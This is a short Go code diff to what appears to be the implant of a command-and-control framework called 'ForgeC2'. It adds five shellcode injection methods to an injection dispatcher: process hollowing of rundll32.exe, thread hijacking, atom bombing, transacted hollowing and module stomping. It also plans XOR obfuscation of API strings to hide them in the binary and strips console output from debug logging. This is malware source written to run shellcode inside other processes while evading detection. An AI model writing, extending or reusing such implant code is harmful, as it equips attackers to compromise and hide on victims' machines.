@@ -67,6 +67,7 @@ var (
 )
 
 // Process injection proc declarations
+// TODO: Obfuscate these strings using XOR (strxor) to reduce string visibility in the binary
 var (
 	procOpenProcessEx      = k32.NewProc("OpenProcess")
 	procVirtualAllocEx     = k32.NewProc("VirtualAllocEx")
@@ -251,7 +252,6 @@ func debugLog(msg string) {
 	if Debug {
 		p, _ := syscall.UTF16PtrFromString("[ForgeC2] " + msg)
 		procOutputDebugStringW.Call(uintptr(unsafe.Pointer(p)))
-		fmt.Println(msg)
 	}
 }
 
@@ -297,6 +297,16 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 		return doSyscallInject(hProc, shellcode)
 	case "indirect":
 		return doNtCreateThreadExIndirect(hProc, shellcode)
+	case "hollow":
+		return hollowProcess("rundll32.exe", shellcode)
+	case "hijack":
+		return hijackThread(pid, shellcode)
+	case "atom":
+		return atomBombingInject(pid, shellcode)
+	case "txf":
+		return transactedHollow(shellcode)
+	case "stomp":
+		return moduleStompInject(pid, shellcode)
 	default:
 		return doCreateRemoteThread(hProc, shellcode)
 	}
